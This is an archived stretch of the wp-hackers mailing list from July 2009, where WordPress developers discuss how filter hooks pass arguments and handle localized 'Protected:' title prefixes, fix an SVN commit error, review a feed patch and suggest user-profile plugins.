Message-ID: <aa12c8990907292250v63b36feap3d032dc94604e56c@mail.gmail.com>

Hi Jeremy,
Thank you very much.

It helped to accomplish what I needed, but did not accomplish the "how to
work" :-)

I did understood everything regarding the workflow, but that $s variable
that is passed automatically in:

       function remove_protected_title_format($s) {
               return str_replace('Protected: ', '', $s);
       }


 add_filter('protected_title_format', 'remove_protected_title_format');

where and how do I know what to expect from that? And what about if I was
expecting $id (page id)... I don't get where this variable appears from thin
air :-(

Sorry not to reply sooner, I'm new to this mailing list :)
I know and work with Google Groups but here if more weird cause there is no
interf


Bruno Alexandre
[web] www.balexandre.com
[twitter] http://twitter.com/balexandre


Mike Ditka <http://www.brainyquote.com/quotes/authors/m/mike_ditka.html>  -
"If God had wanted man to play soccer, he wouldn't have given us arms."

On Thu, Jul 30, 2009 at 7:50 AM, Bruno Alexandre <bruno.in.dk at gmail.com>wrote:

> Hi Jeremy,
> Thank you very much.
>
> It helped to accomplish what I needed, but did not accomplish the "how to
> work" :-)
>
> I did understood everything regarding the workflow, but that $s variable
> that is passed automatically in:
>
>        function remove_protected_title_format($s) {
>                return str_replace('Protected: ', '', $s);
>        }
>
>
>  add_filter('protected_title_format', 'remove_protected_title_format');
>
> where and how do I know what to expect from that? And what about if I was
> expecting $id (page id)... I don't get where this variable appears from thin
> air :-(
>
> Sorry not to reply sooner, I'm new to this mailing list :)
> I know and work with Google Groups but here if more weird cause there is no
> interf
>
>
> Bruno Alexandre
> [web] www.balexandre.com
> [twitter] http://twitter.com/balexandre
>
>
> Stephen Leacock<http://www.brainyquote.com/quotes/authors/s/stephen_leacock.html> - "I detest life-insurance agents: they always argue that I shall some day
> die, which is not so."
>
> On Thu, Jul 30, 2009 at 2:54 AM, Jeremy Visser <jeremy at visser.name> wrote:
>
>> Hi Bruno,
>>
>> Did you get my response to your wp-hackers post? Did it help?
>>
>> Thanks,
>> Jeremy.
>>
>
>

From barry at automattic.com  Thu Jul 30 06:31:07 2009
From: barry at automattic.com (Barry Abrahamson)
Date: Thu, 30 Jul 2009 01:31:07 -0500
Subject: [wp-hackers] can't commit to http://svn.wp-plugins.org
In-Reply-To: <B57DDD4D-4721-4828-8CDC-5BBA0B653926@xentek.net>
References: <4997275b0907292108h1ee5c51h1b475e0a0989aee1@mail.gmail.com>
	<B57DDD4D-4721-4828-8CDC-5BBA0B653926@xentek.net>
Message-ID: <AA512648-5C80-4D5A-9DED-51EF72BCBDC5@automattic.com>


On Jul 30, 2009, at 12:42 AM, Eric Marden wrote:

> lmgtfy: http://www.marco.org/36354137/svn-mkactivity-could-not-parse-response-status-line

Since our subversion servers aren't running behind a reverse proxy  
this probably means either:

1) There is some network problem between your location and the svn  
server location causing some sort of data corruption or packet loss.   
We have seen these problems from time to time usually from connections  
outside the US and each time they have resolved themselves on their own

2) There is some sort of forward proxy (probably squid) that either  
you are using explicitly or your ISP is using without telling you  
which is causing the problem.  If you are knowingly using some sort of  
proxy, I would try disabling it and see what happens.  Alternatively,  
if you aren't using a proxy, maybe you can try using one and see if  
that resolves the issue.

Hope this helps,

Barry

--
Barry Abrahamson | Systems Wrangler | Automattic
Blog: http://barry.wordpress.com


From jeremy at visser.name  Thu Jul 30 06:45:02 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Thu, 30 Jul 2009 16:45:02 +1000
Subject: [wp-hackers] Hooks, Actions, Filters
In-Reply-To: <aa12c8990907292250v63b36feap3d032dc94604e56c@mail.gmail.com>
References: <aa12c8990907282338y168194far850e3c5b60c2a34c@mail.gmail.com>
	<1248915286.9476.0.camel@rillian.narnia.sunriseroad.net>
	<aa12c8990907292250h4db8aed5wb08511d26f8284c9@mail.gmail.com>
	<aa12c8990907292250v63b36feap3d032dc94604e56c@mail.gmail.com>
Message-ID: <1248936302.28072.2.camel@rillian.narnia.sunriseroad.net>

On Thu, 2009-07-30 at 07:50 +0200, Bruno Alexandre wrote:
> where and how do I know what to expect from that? And what about if I was
> expecting $id (page id)... I don't get where this variable appears from thin
> air :-(

Not sure I completely understand your question, but in a function, you
can name the parameters whatever you want. The following functions would
all work identically:

       function remove_protected_title_format($tom) {
               return str_replace('Protected: ', '', $tom);
       }

       function remove_protected_title_format($dick) {
               return str_replace('Protected: ', '', $dick);
       }

       function remove_protected_title_format($harry) {
               return str_replace('Protected: ', '', $harry);
       }

Because when you call it, all you do is pass the parameter, not the name
of it:

	remove_protected_title_format('the argument');

Notice how I didn't need to specify the variable name (tom, dick, or
harry). You don't need to do this for example (and this is invalid):

	remove_protected_title_format($s = 'the argument');

Hope I've clarified things.


From smibrahim at gmail.com  Thu Jul 30 09:28:17 2009
From: smibrahim at gmail.com (S. M. Ibrahim (Lavlu))
Date: Thu, 30 Jul 2009 16:28:17 +0700
Subject: [wp-hackers] can't commit to http://svn.wp-plugins.org
In-Reply-To: <AA512648-5C80-4D5A-9DED-51EF72BCBDC5@automattic.com>
References: <4997275b0907292108h1ee5c51h1b475e0a0989aee1@mail.gmail.com>
	<B57DDD4D-4721-4828-8CDC-5BBA0B653926@xentek.net>
	<AA512648-5C80-4D5A-9DED-51EF72BCBDC5@automattic.com>
Message-ID: <4997275b0907300228l2fd79382x3db241b48b6b6802@mail.gmail.com>

thanks for reply, i am using lot's of subversion repository from my
office and home (both are different network) and just one week ago i
successfully committed to wp-plugins repository without any problem
from home and office . nothing changed, all the other repository are
working, just this one making problem.

so i don't think my network has any problem. anything to check on my
system ? i am running mac os x 10.5.7 on macbook pro.



thanks, i need to solve it as early as possible to release the next version.



2009/7/30 Barry Abrahamson <barry at automattic.com>:
>
> On Jul 30, 2009, at 12:42 AM, Eric Marden wrote:
>
>> lmgtfy:
>> http://www.marco.org/36354137/svn-mkactivity-could-not-parse-response-status-line
>
> Since our subversion servers aren't running behind a reverse proxy this
> probably means either:
>
> 1) There is some network problem between your location and the svn server
> location causing some sort of data corruption or packet loss. ?We have seen
> these problems from time to time usually from connections outside the US and
> each time they have resolved themselves on their own
>
> 2) There is some sort of forward proxy (probably squid) that either you are
> using explicitly or your ISP is using without telling you which is causing
> the problem. ?If you are knowingly using some sort of proxy, I would try
> disabling it and see what happens. ?Alternatively, if you aren't using a
> proxy, maybe you can try using one and see if that resolves the issue.
>
> Hope this helps,
>
> Barry
>
> --
> Barry Abrahamson | Systems Wrangler | Automattic
> Blog: http://barry.wordpress.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
S. M. Ibrahim Lavlu
software engineer, php
somewhere in...
http://www.somewherein.net

bangla blog: http://www.somewhereinblog.net
my blog: http://www.lavluda.com
mac blog: htttp://www.mac-talks.com

From peaceable_whale at hotmail.com  Thu Jul 30 10:05:27 2009
From: peaceable_whale at hotmail.com (Franklin Tse)
Date: Thu, 30 Jul 2009 18:05:27 +0800
Subject: [wp-hackers] Request for review and comments to #9510
Message-ID: <BAY101-DS61A8060212562A8E4B9E89F130@phx.gbl>

Hello testers,

I would like to ask for review and comments to my patch (9510-v4.patch) for #9510 (http://core.trac.wordpress.org/ticket/9510). The patch is expected to fix many issues in feeds.

Features of the patch:
1. Different feed query now have different title, subtitle, link and comment link (fix the original issue of #9510 and #4253)
2. Tags and Categories are now identifiable in feeds (fixes #8828)
3. Authors can now display their email addresses in feed by a plugin (fixes #9831)
4. The title of Atom feed is now "text" (fixes #9992)
5. The comment feed returned by wfw:commentRss is now fixed to be RSS 2 (fixes #10016)
6. Feed content will not be disappeared unexpectedly in RSS 2 feed (fixes #10509)
7. Comment information in feeds can now be modified/removed by plugin (fixes #9134)
8. The Atom ID will not change even if the permalink setting is changed
9. Atom feed also supports sy:updatePeriod and sy:updateFrequency now
10. The type of Atom entry content is now linked to get_bloginfo("html_type")
11. Most of the XML elements in the feeds can be modified by plugins via filters
12. The readability of the XML code is improved

Thanks in advance for your comments!

Regards,
Franklin Tse

CC: hackers, for dev-feedback 

From niladam at gmail.com  Thu Jul 30 11:37:12 2009
From: niladam at gmail.com (madalin)
Date: Thu, 30 Jul 2009 14:37:12 +0300
Subject: [wp-hackers] user profiles
Message-ID: <df809b110907300437q1a35245csb25d7e76ac03e1a5@mail.gmail.com>

Hello,

I'm not sure this is the best solution for my question, but i've
searched for the past few days a good plugin that could allow me to
add (actually a registered member) some other fields into his profile.
Also, displaying that profile and a list perhaps (the list could be
done with a simple query) and most important a PROFILE page for each
member (viewable only by them and such.

Can you please recommend me something if you are aware of ? Thank you
and please excuse me for emailing the list for such things.

Madalin

-- 
Cu drag,
madalin
http://madalin.eu

From junsuijin at gmail.com  Thu Jul 30 12:19:13 2009
From: junsuijin at gmail.com (Tynan Colin Beatty)
Date: Thu, 30 Jul 2009 07:19:13 -0500
Subject: [wp-hackers] user profiles
In-Reply-To: <df809b110907300437q1a35245csb25d7e76ac03e1a5@mail.gmail.com>
References: <df809b110907300437q1a35245csb25d7e76ac03e1a5@mail.gmail.com>
Message-ID: <4f9525dc0907300519o483fd338h314032282d6b6c40@mail.gmail.com>

WordPress Mu + BuddyPress

On Thu, Jul 30, 2009 at 6:37 AM, madalin <niladam at gmail.com> wrote:

> Hello,
>
> I'm not sure this is the best solution for my question, but i've
> searched for the past few days a good plugin that could allow me to
> add (actually a registered member) some other fields into his profile.
> Also, displaying that profile and a list perhaps (the list could be
> done with a simple query) and most important a PROFILE page for each
> member (viewable only by them and such.
>
> Can you please recommend me something if you are aware of ? Thank you
> and please excuse me for emailing the list for such things.
>
> Madalin
>
> --
> Cu drag,
> madalin
> http://madalin.eu
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jordi at jcanals.net  Thu Jul 30 12:51:16 2009
From: jordi at jcanals.net (Jordi Canals)
Date: Thu, 30 Jul 2009 14:51:16 +0200
Subject: [wp-hackers] user profiles
In-Reply-To: <4f9525dc0907300519o483fd338h314032282d6b6c40@mail.gmail.com>
References: <df809b110907300437q1a35245csb25d7e76ac03e1a5@mail.gmail.com>
	<4f9525dc0907300519o483fd338h314032282d6b6c40@mail.gmail.com>
Message-ID: <eccf48430907300551x160630dv21e6be02adc32338@mail.gmail.com>

Hi Tynan,

I'm working on something like that. A plugin that provides a user list a
profile page and, optionally a user gallery.

In the next version I will release next week you will be able to use any
user field on the user profile page. By now you can set the custom fields
with Register plus, as this part is being developed on my plugin and will be
available in one month or so.

You can get it at http://wordpress.org/extend/plugins/alkivia/

Regards,
---
Jordi Canals
http://alkivia.org


2009/7/30 Tynan Colin Beatty <junsuijin at gmail.com>

> WordPress Mu + BuddyPress
>
> On Thu, Jul 30, 2009 at 6:37 AM, madalin <niladam at gmail.com> wrote:
>
> > Hello,
> >
> > I'm not sure this is the best solution for my question, but i've
> > searched for the past few days a good plugin that could allow me to
> > add (actually a registered member) some other fields into his profile.
> > Also, displaying that profile and a list perhaps (the list could be
> > done with a simple query) and most important a PROFILE page for each
> > member (viewable only by them and such.
> >
> > Can you please recommend me something if you are aware of ? Thank you
> > and please excuse me for emailing the list for such things.
> >
> > Madalin
> >
> > --
> > Cu drag,
> > madalin
> > http://madalin.eu
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Thu Jul 30 13:28:28 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 30 Jul 2009 08:28:28 -0500
Subject: [wp-hackers] ajax and $wpdb
In-Reply-To: <8071A838-BE43-425B-9B04-C0FC73A142DB@xentek.net>
References: <d0cdc35c0907290326o6f4100d4ve3af9ff8df5d9a2@mail.gmail.com> 
	<77c8b7bf0907291105q2e26941fq2b98e167b9c38306@mail.gmail.com> 
	<42DF740CBF5256498541B6CA6DB6E56D04811713@USA7061MS03.na.xerox.net> 
	<8071A838-BE43-425B-9B04-C0FC73A142DB@xentek.net>
Message-ID: <161617690907300628ybfa3d77ja9384aa5ccb1abd7@mail.gmail.com>

The short of it is that there is never really a need for your plugin
to directly include the WordPress code, via wp-load or wp-config or
anything else.

The cases where people try to do this are multiple, but end up being
resolvable through different means.

Case 1: AJAX.
You have your plugin calling some file in the plugin via script tags
or ajax or something, and you think "hey, since I need access to the
DB, this ajax file I'm making needs to include wp-load". False, your
plugin needs to hook into the wp_ajax_* actions and you need to make
the page make a call to admin_url('admin-ajax.php'); with a proper
?action=whatever parameter.

Case 2: You need to get some kind of output from a separate call to a
file in your plugin.
You have your plugin calling some other file in the plugin, which
produces some special kind of output (image, text, whatever), and it
needs access to WordPress functions and such, so you want to include
wp-load. Again, false. Your plugin needs to hook into
template_redirect and add a query variable so it can recognize when
it's being called. Example:

add_filter('query_vars', 'add_my_var');
function add_my_var($public_query_vars) {
	$public_query_vars[] = 'some_unique_identifier';
	return $public_query_vars;
}

add_action('template_redirect', 'my_var_output');
function my_var_output() {
	$myvalue=get_query_var('some_unique_identifier');
	if ($myvalue) {
		// do whatever output you like here
		// you can even use $myvalue to see what the request is for
		exit; // this stops WordPress entirely
	}
}

Any call to the main WP url with ?=some_unique_identifier=whatever
will now cause your output to run and WordPress to stop execution
afterwards. So you can override the output with anything you like.
Want an image output? Throw out a header() call to set the mime type
and output the image data. And since you're in a plugin context, you
have WP functions available to you.

So, never include wp-load (or blog-header or config, etc) from a
plugin, even a separate file. It's simply not necessary.

-Otto

From otto at ottodestruct.com  Thu Jul 30 13:32:56 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 30 Jul 2009 08:32:56 -0500
Subject: [wp-hackers] Hooks, Actions, Filters
In-Reply-To: <aa12c8990907292250v63b36feap3d032dc94604e56c@mail.gmail.com>
References: <aa12c8990907282338y168194far850e3c5b60c2a34c@mail.gmail.com> 
	<1248915286.9476.0.camel@rillian.narnia.sunriseroad.net>
	<aa12c8990907292250h4db8aed5wb08511d26f8284c9@mail.gmail.com> 
	<aa12c8990907292250v63b36feap3d032dc94604e56c@mail.gmail.com>
Message-ID: <161617690907300632o7835519cxf97c6cb02862a203@mail.gmail.com>

On Thu, Jul 30, 2009 at 12:50 AM, Bruno Alexandre<bruno.in.dk at gmail.com> wrote:
> where and how do I know what to expect from that? And what about if I was
> expecting $id (page id)... I don't get where this variable appears from thin
> air :-(

If you look deep enough in the WordPress code, you'll find this line:

$protected_title_format = apply_filters('protected_title_format',
__('Protected: %s'));

That call to apply_filters is what links the internals of WordPress to
your filter function. This bit in particular is what you're wanting:

 __('Protected: %s')

That is what gets passed into your function as the first parameter. In
this case, it's a translatable string.

-Otto
Sent from Memphis, TN, United States

From jer at simianuprising.com  Thu Jul 30 15:04:48 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Thu, 30 Jul 2009 11:04:48 -0400
Subject: [wp-hackers] Hooks, Actions, Filters
In-Reply-To: <aa12c8990907292250v63b36feap3d032dc94604e56c@mail.gmail.com>
References: <aa12c8990907282338y168194far850e3c5b60c2a34c@mail.gmail.com>
	<1248915286.9476.0.camel@rillian.narnia.sunriseroad.net>
	<aa12c8990907292250h4db8aed5wb08511d26f8284c9@mail.gmail.com>
	<aa12c8990907292250v63b36feap3d032dc94604e56c@mail.gmail.com>
Message-ID: <e1202cb10907300804q7740c949g84a318f30a4ed30c@mail.gmail.com>

On Thu, Jul 30, 2009 at 1:50 AM, Bruno Alexandre<bruno.in.dk at gmail.com> wrote:
> where and how do I know what to expect from that? And what about if I was
> expecting $id (page id)...

Just to quickly answer this other question. Some filters and actions
pass multiple values so that you can also have information like
page/post id. In this case its not available though.

Luckily one thing that tends to work for situations like this is to
globalize $post. If you're in the loop or on a single article page
(whether in the admin or frontend) $post normally contains the full
object for the post being worked on.

So in your filter function you can probably do:

global $post;
echo $post->ID;

Note that $post is used even if its a page.

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From wp-hackers at itsananderson.com  Thu Jul 30 16:16:26 2009
From: wp-hackers at itsananderson.com (Will Anderson)
Date: Thu, 30 Jul 2009 12:16:26 -0400
Subject: [wp-hackers] Hooks, Actions, Filters
In-Reply-To: <e1202cb10907300804q7740c949g84a318f30a4ed30c@mail.gmail.com>
References: <aa12c8990907282338y168194far850e3c5b60c2a34c@mail.gmail.com>
	<1248915286.9476.0.camel@rillian.narnia.sunriseroad.net>
	<aa12c8990907292250h4db8aed5wb08511d26f8284c9@mail.gmail.com>
	<aa12c8990907292250v63b36feap3d032dc94604e56c@mail.gmail.com>
	<e1202cb10907300804q7740c949g84a318f30a4ed30c@mail.gmail.com>
Message-ID: <6dbcd2670907300916p776a0ecat4230a19be45289cc@mail.gmail.com>

On Thu, Jul 30, 2009 at 11:04 AM, Jeremy Clarke <jer at simianuprising.com>wrote:

> Just to quickly answer this other question. Some filters and actions
> pass multiple values so that you can also have information like
> page/post id. In this case its not available though.
>
> Luckily one thing that tends to work for situations like this is to
> globalize $post. If you're in the loop or on a single article page
> (whether in the admin or frontend) $post normally contains the full
> object for the post being worked on.
>
> So in your filter function you can probably do:
>
> global $post;
> echo $post->ID;
>
> Note that $post is used even if its a page.
>
> --
> Jeremy Clarke | http://jeremyclarke.org
> Code and Design | http://globalvoicesonline.org


The function in question (get_the_title) actually accepts an optional
argument which can specify the post ID, so while in most cases $post will
contain the ID of the post we're looking at, it's not necessarily safe to
assume this will ALWAYS be the case.

For example, suppose I'm listing related posts below a single post. If you
assume the $post object contains the ID of the post you're dealing with,
you'll always have the same ID, even though you'll be filtering different
titles.

If you need the post ID, it's probably better to attach your filter to the
"the_title" filter, which DOES pass the post's ID (per
http://core.trac.wordpress.org/browser/trunk/wp-includes/post-template.php?rev=11642#L120and
http://core.trac.wordpress.org/ticket/9666 ). From what you're trying to
accomplish, this is probably better anyway.


I also want to comment on the following code, which was provided earlier as
a solution for removing 'Private: ' from the post title.

      function remove_protected_title_format($s) {
              return str_replace('Protected: ', '', $s);
      }

The problem with this is that if the blog has localization set up, you
aren't guaranteed to have the "Protected: " text. It could easily be in
Spanish, French, or German (to name a few).

One solution might be to simply keep the format string, like so:

      function remove_protected_title_format($s) {
               return '%s';
      }

The problem with this of course is that if another plugin is trying to add
to the title, and that filter is run first, you'll overwrite it. It's still
probably safer to do it this way, though (I don't think many plugins will
try to add things here).

I actually submitted the patch to add these filters and, while they're
certainly better than nothing, they still seem like a bit of a kludge (as
evidenced by the issue I just enumerated). If anyone has a better idea for
how the "Private: " and "Protected: " tags might be added, such that they
can optionally be removed, that'd be awesome.

Here's the ticket for the patch I submitted:
http://core.trac.wordpress.org/ticket/8918

Best,
Will Anderson
http://www.itsananderson.com/

From steve at sltaylor.co.uk  Thu Jul 30 21:41:37 2009
From: steve at sltaylor.co.uk (Steve Taylor)
Date: Thu, 30 Jul 2009 22:41:37 +0100
Subject: [wp-hackers] user profiles
In-Reply-To: <df809b110907300437q1a35245csb25d7e76ac03e1a5@mail.gmail.com>
References: <df809b110907300437q1a35245csb25d7e76ac03e1a5@mail.gmail.com>
Message-ID: <a21f8bf00907301441i162eeb3ek6dad190efab76ec@mail.gmail.com>

This plugins is pretty flexible for extra fields:

http://wordpress.org/extend/plugins/cimy-user-extra-fields/

Not sure if this or another plugin handles profile pages, but I've
coded them easily in the past into custom themes. The author archive
template (author.php) is a good starting point.

However, if this is the foundation for a more comprehensive
user-focused system, maybe BuddyPress is the way to go...

Steve


2009/7/30 madalin <niladam at gmail.com>:
> Hello,
>
> I'm not sure this is the best solution for my question, but i've
> searched for the past few days a good plugin that could allow me to
> add (actually a registered member) some other fields into his profile.
> Also, displaying that profile and a list perhaps (the list could be
> done with a simple query) and most important a PROFILE page for each
> member (viewable only by them and such.
>
> Can you please recommend me something if you are aware of ? Thank you
> and please excuse me for emailing the list for such things.
>
> Madalin
>
> --
> Cu drag,
> madalin
> http://madalin.eu
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Fri Jul 31 11:37:44 2009
From: scribu at gmail.com (scribu)
Date: Fri, 31 Jul 2009 11:37:44 +0000
Subject: [wp-hackers] Hooks, Actions, Filters
In-Reply-To: <6dbcd2670907300916p776a0ecat4230a19be45289cc@mail.gmail.com>
References: <aa12c8990907282338y168194far850e3c5b60c2a34c@mail.gmail.com>
	<1248915286.9476.0.camel@rillian.narnia.sunriseroad.net>
	<aa12c8990907292250h4db8aed5wb08511d26f8284c9@mail.gmail.com>
	<aa12c8990907292250v63b36feap3d032dc94604e56c@mail.gmail.com>
	<e1202cb10907300804q7740c949g84a318f30a4ed30c@mail.gmail.com>
	<6dbcd2670907300916p776a0ecat4230a19be45289cc@mail.gmail.com>
Message-ID: <349fe48b0907310437q319ad18fld814a742bce1a8bd@mail.gmail.com>

You could just write

return str_replace(__('Protected:'), '', $format);

to account for l10n.

On 7/30/09, Will Anderson <wp-hackers at itsananderson.com> wrote:
> On Thu, Jul 30, 2009 at 11:04 AM, Jeremy Clarke
> <jer at simianuprising.com>wrote:
>
>> Just to quickly answer this other question. Some filters and actions
>> pass multiple values so that you can also have information like
>> page/post id. In this case its not available though.
>>
>> Luckily one thing that tends to work for situations like this is to
>> globalize $post. If you're in the loop or on a single article page
>> (whether in the admin or frontend) $post normally contains the full
>> object for the post being worked on.
>>
>> So in your filter function you can probably do:
>>
>> global $post;
>> echo $post->ID;
>>
>> Note that $post is used even if its a page.
>>
>> --
>> Jeremy Clarke | http://jeremyclarke.org
>> Code and Design | http://globalvoicesonline.org
>
>
> The function in question (get_the_title) actually accepts an optional
> argument which can specify the post ID, so while in most cases $post will
> contain the ID of the post we're looking at, it's not necessarily safe to
> assume this will ALWAYS be the case.
>
> For example, suppose I'm listing related posts below a single post. If you
> assume the $post object contains the ID of the post you're dealing with,
> you'll always have the same ID, even though you'll be filtering different
> titles.
>
> If you need the post ID, it's probably better to attach your filter to the
> "the_title" filter, which DOES pass the post's ID (per
> http://core.trac.wordpress.org/browser/trunk/wp-includes/post-template.php?rev=11642#L120and
> http://core.trac.wordpress.org/ticket/9666 ). From what you're trying to
> accomplish, this is probably better anyway.
>
>
> I also want to comment on the following code, which was provided earlier as
> a solution for removing 'Private: ' from the post title.
>
>       function remove_protected_title_format($s) {
>               return str_replace('Protected: ', '', $s);
>       }
>
> The problem with this is that if the blog has localization set up, you
> aren't guaranteed to have the "Protected: " text. It could easily be in
> Spanish, French, or German (to name a few).
>
> One solution might be to simply keep the format string, like so:
>
>       function remove_protected_title_format($s) {
>                return '%s';
>       }
>
> The problem with this of course is that if another plugin is trying to add
> to the title, and that filter is run first, you'll overwrite it. It's still
> probably safer to do it this way, though (I don't think many plugins will
> try to add things here).
>
> I actually submitted the patch to add these filters and, while they're
> certainly better than nothing, they still seem like a bit of a kludge (as
> evidenced by the issue I just enumerated). If anyone has a better idea for
> how the "Private: " and "Protected: " tags might be added, such that they
> can optionally be removed, that'd be awesome.
>
> Here's the ticket for the patch I submitted:
> http://core.trac.wordpress.org/ticket/8918
>
> Best,
> Will Anderson
> http://www.itsananderson.com/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
http://scribu.net

From wp-hackers at itsananderson.com  Fri Jul 31 12:49:58 2009
From: wp-hackers at itsananderson.com (Will Anderson)
Date: Fri, 31 Jul 2009 08:49:58 -0400
Subject: [wp-hackers] Hooks, Actions, Filters
In-Reply-To: <349fe48b0907310437q319ad18fld814a742bce1a8bd@mail.gmail.com>
References: <aa12c8990907282338y168194far850e3c5b60c2a34c@mail.gmail.com>
	<1248915286.9476.0.camel@rillian.narnia.sunriseroad.net>
	<aa12c8990907292250h4db8aed5wb08511d26f8284c9@mail.gmail.com>
	<aa12c8990907292250v63b36feap3d032dc94604e56c@mail.gmail.com>
	<e1202cb10907300804q7740c949g84a318f30a4ed30c@mail.gmail.com>
	<6dbcd2670907300916p776a0ecat4230a19be45289cc@mail.gmail.com>
	<349fe48b0907310437q319ad18fld814a742bce1a8bd@mail.gmail.com>
Message-ID: <6dbcd2670907310549v31c78256vfae13217edc806d1@mail.gmail.com>

On Fri, Jul 31, 2009 at 7:37 AM, scribu <scribu at gmail.com> wrote:

> You could just write
>
> return str_replace(__('Protected:'), '', $format);
>
> to account for l10n.
>
> --
> http://scribu.net


But if they're using a localized version of WordPress, that requires your
plugin to not only be translated, but translated with the same text.

Additionally, what if the localization translated the string to something
like 'zaza %s sese'? The solution still won't work, regardless of whether
your plugin is localized or not.

What I'm wondering is if the "Protected" and "Private" code should be moved
to separate functions which are attached to the the_title filter. Here's one
way it could be done:

function get_the_title( $id = 0 ) {
        $post = &get_post($id);

        $title = $post->post_title;

        if ( !is_admin() ) {
                if ( empty($post->post_password) ) {
                    remove_filter('the_title', 'format_protected_title');
                } else if ( !isset($post->post_status) || 'private' !=
$post->post_status ) {
                    remove_filter('the_title', 'format_private_title');
                }
        }
        return apply_filters( 'the_title', $title, $post->ID );
}

function format_protected_title( $title, $id ) {
    $protected_title_format = apply_filters('protected_title_format',
__('Protected: %s'));
    return sprintf($protected_title_format, $title);
}

function format_private_title( $title, $id ) {
    $private_title_format = apply_filters('private_title_format',
__('Private: %s'));
    return sprintf($private_title_format, $title);
}

The second two functions would be added as filters on 'the_title' elsewhere
(is there a file somewhere that adds all the core filters?)

The issue here is that if a plugin author called the 'the_title' filter on a
post title without removing those two functions, they'll get something like
'Protected: Private: Post Title', regardless of the post's privacy status.

Here's a second solution that has a bit more overhead, but doesn't have the
problem just described.

function get_the_title( $id = 0 ) {
        $post = &get_post($id);

        $title = $post->post_title;

        return apply_filters( 'the_title', $title, $post->ID );
}

function format_protected_title( $title, $id ) {
    $post = &get_post($id);

    if ( !is_admin() ) {
        if ( !empty($post->post_password) ) {
            $protected_title_format =
apply_filters('protected_title_format', __('Protected: %s'));
            return sprintf($protected_title_format, $title);
        }
    }
}

function format_private_title( $title, $id ) {
    $post = &get_post($id);

    if ( !is_admin() ) {
        if ( isset($post->post_status) && 'private' == $post->post_status )
{
            $private_title_format = apply_filters('private_title_format',
__('Private: %s'));
            return sprintf($private_title_format, $title);
        }
    }
}

The problem here is that we're *always* getting the post object 3 times. I'm
not sure whether that's cached by WordPress, but it's got to have a
performance impact. All the same, it's probably a slightly safer solution.

Thoughts?

-- 
Will Anderson
http://www.itsananderson.com/

From scribu at gmail.com  Fri Jul 31 13:02:35 2009
From: scribu at gmail.com (scribu)
Date: Fri, 31 Jul 2009 13:02:35 +0000
Subject: [wp-hackers] Hooks, Actions, Filters
In-Reply-To: <6dbcd2670907310549v31c78256vfae13217edc806d1@mail.gmail.com>
References: <aa12c8990907282338y168194far850e3c5b60c2a34c@mail.gmail.com>
	<1248915286.9476.0.camel@rillian.narnia.sunriseroad.net>
	<aa12c8990907292250h4db8aed5wb08511d26f8284c9@mail.gmail.com>
	<aa12c8990907292250v63b36feap3d032dc94604e56c@mail.gmail.com>
	<e1202cb10907300804q7740c949g84a318f30a4ed30c@mail.gmail.com>
	<6dbcd2670907300916p776a0ecat4230a19be45289cc@mail.gmail.com>
	<349fe48b0907310437q319ad18fld814a742bce1a8bd@mail.gmail.com>
	<6dbcd2670907310549v31c78256vfae13217edc806d1@mail.gmail.com>
Message-ID: <349fe48b0907310602s5055f931n14757356aef2a5ca@mail.gmail.com>

My solution works because it's using the same textdomain as WP core,
so all the issues you mentioned dissapear.

-- 
http://scribu.net

From wp-hackers at itsananderson.com  Fri Jul 31 13:15:50 2009
From: wp-hackers at itsananderson.com (Will Anderson)
Date: Fri, 31 Jul 2009 09:15:50 -0400
Subject: [wp-hackers] Hooks, Actions, Filters
In-Reply-To: <349fe48b0907310602s5055f931n14757356aef2a5ca@mail.gmail.com>
References: <aa12c8990907282338y168194far850e3c5b60c2a34c@mail.gmail.com>
	<1248915286.9476.0.camel@rillian.narnia.sunriseroad.net>
	<aa12c8990907292250h4db8aed5wb08511d26f8284c9@mail.gmail.com>
	<aa12c8990907292250v63b36feap3d032dc94604e56c@mail.gmail.com>
	<e1202cb10907300804q7740c949g84a318f30a4ed30c@mail.gmail.com>
	<6dbcd2670907300916p776a0ecat4230a19be45289cc@mail.gmail.com>
	<349fe48b0907310437q319ad18fld814a742bce1a8bd@mail.gmail.com>
	<6dbcd2670907310549v31c78256vfae13217edc806d1@mail.gmail.com>
	<349fe48b0907310602s5055f931n14757356aef2a5ca@mail.gmail.com>
Message-ID: <6dbcd2670907310615x6a9407a7m6e36d798c4299042@mail.gmail.com>

I have to admit I only have a vague understanding of the way WordPress does
localization, but I can't see how one of the issues I mentioned isn't a
problem.

If the localization happens to return a format string like 'zaza %s sese',
how could doing a "find replace" on __('Protected: ') ever remove *both*
'zaza' and 'sese'? This is admittedly an edge case, but I still don't see
how your solution resolves it.

-- 
Will Anderson
http://www.itsananderson.com/

From jeremy at visser.name  Fri Jul 31 13:29:43 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Fri, 31 Jul 2009 23:29:43 +1000
Subject: [wp-hackers] Hooks, Actions, Filters
In-Reply-To: <349fe48b0907310437q319ad18fld814a742bce1a8bd@mail.gmail.com>
References: <aa12c8990907282338y168194far850e3c5b60c2a34c@mail.gmail.com>
	<1248915286.9476.0.camel@rillian.narnia.sunriseroad.net>
	<aa12c8990907292250h4db8aed5wb08511d26f8284c9@mail.gmail.com>
	<aa12c8990907292250v63b36feap3d032dc94604e56c@mail.gmail.com>
	<e1202cb10907300804q7740c949g84a318f30a4ed30c@mail.gmail.com>
	<6dbcd2670907300916p776a0ecat4230a19be45289cc@mail.gmail.com>
